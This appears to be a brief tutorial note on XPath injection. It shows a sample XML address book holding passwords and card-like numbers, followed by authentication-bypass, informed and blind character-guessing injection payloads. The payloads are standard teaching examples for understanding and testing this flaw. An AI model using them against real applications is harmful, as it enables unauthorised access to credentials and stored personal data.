# XPATH Injection

The XML Path Language (XPath) is an interpreted language used to navigate around XML documents and to retrieve data from within them.

For the below XML data store

```
<addressBook>
    <address>
        <firstName>William</firstName>
        <surname>Gates</surname>
        <password>MSRocks!</password>
        <email>billyg@microsoft.com</email>
        <ccard>5130 8190 3282 3515</ccard>
    </address>
    <address>
        <firstName>Chris</firstName>
        <surname>Dawes</surname>
        <password>secret</password>
        <email>cdawes@craftnet.de</email>
        <ccard>3981 2491 3242 3121</ccard>
    </address>
    <address>
        <firstName>James</firstName>
        <surname>Hunter</surname>
        <password>letmein</password>
        <email>james.hunter@pookmail.com</email>
        <ccard>8113 5320 8014 3313</ccard>
    </address>
</addressBook>
```

XPath Query to retrieve email -> `//address/email/text()`

XPath Query to retrieve details of user Dawes -> `//address[surname/text()=’Dawes’]`

* **Examples of Xpath Injection**
  * **Base Scenario**
    * `//address[surname/text()=’Dawes’ and password/text()=’’ or ‘a’=’a’]/ ccard/text()`
  * **Informed XPath Injection**
    * Check letters one by one
    * `‘ or //address[surname/text()=’Gates’ and substring(password/text(),1,1)= ‘M’] and ‘a’=’a`
  * **Blind XPath Injection**
    * Suppose we need to find name of address node
    * Loop over each character and check each letter
    * `‘ or substring(name(parent::*[position()=1]),1,1)= ‘a`
